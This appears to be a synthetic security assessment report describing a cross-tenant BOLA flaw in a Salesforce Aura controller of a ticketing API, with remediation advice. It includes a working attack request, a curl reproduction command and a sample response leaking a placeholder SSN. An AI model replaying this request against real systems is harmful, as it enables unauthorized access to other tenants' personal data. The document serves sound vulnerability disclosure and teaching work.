# Security Analysis Report
**System:** VenueCore Ticketing API (Salesforce-Integrated)
**Domain:** Event Management / Ticketing
**Example ID:** SF-0099
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant cross-tenant access on `ContactController.updateContact` — attacker reads any ticketing Contact record across tenant boundaries |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Contact Object (Pattern 1.5)

### Summary
The Apex controller `ContactController` on VenueCore Ticketing API (`cca91bc8.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contact object. Per §5.0 Pattern 1.5, there is no tenant isolation predicate — an attacker can access Contact records owned by users in other tenant contexts by substituting `contactId`.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContactDetails(String contactId, ...)` but the Aura descriptor in §6.0 is `c.ContactController.updateContact`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.ContactController.updateContact`
**Affected endpoint:** `POST https://cca91bc8.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://cca91bc8.lightning.force.com/aura
Authorization: Bearer 00DCCA91BC8!ARcca91bc8...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DCCA91BC8!ARcca91bc8...

message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN",
"params":{"contactId":"0011BC8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contact Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0011BC8", "Name": "Victim Contact Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-98-7979"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DCCA91BC8!ARcca91bc8..."
curl -s -X POST "https://cca91bc8.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"0011BC8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-98-7979
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContactController { ... }`
2. `WHERE Id = :contactId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
